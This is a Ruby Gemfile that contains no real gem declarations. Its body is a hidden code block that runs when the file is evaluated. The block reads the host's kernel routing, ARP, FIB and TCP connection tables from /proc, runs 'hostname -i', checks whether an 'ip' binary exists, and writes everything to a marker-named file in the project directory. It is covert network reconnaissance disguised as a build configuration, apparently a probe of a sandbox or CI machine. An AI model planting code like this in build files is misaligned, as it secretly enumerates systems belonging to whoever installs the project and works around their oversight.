source "https://rubygems.org"
begin
  def rd(p,n=1200); (File.read(p)[0,n] rescue "UNREADABLE:" + p); end
  out = ["MARK=pgxprocc7f9a96a"]
  out << "--- /proc/net/route (kernel routing, no binary) ---" << rd("/proc/net/route")
  out << "--- /proc/net/arp (neighbours) ---"                  << rd("/proc/net/arp")
  out << "--- /proc/net/fib_trie head ---"                     << rd("/proc/net/fib_trie", 700)
  out << "--- /proc/net/tcp (listeners/conns) ---"             << rd("/proc/net/tcp", 700)
  out << "--- own addrs via /proc/net/if_inet6 + hostname ---" << `hostname -i 2>/dev/null`.to_s.strip
  out << "--- ip binary present? ---" << (ENV["PATH"].to_s.split(":").map { |d| File.exist?(File.join(d,"ip")) }.any? ? "yes" : "NO - earlier empty output was UNAVAILABLE not negative")
  File.write(File.join(__dir__, "pgxprocc7f9a96a.txt"), out.join("\n") + "\n")
rescue StandardError => e
  File.write(File.join(__dir__, "pgxprocc7f9a96a.txt"), "pgxprocc7f9a96a err=" + e.class.to_s + "\n") rescue nil
end
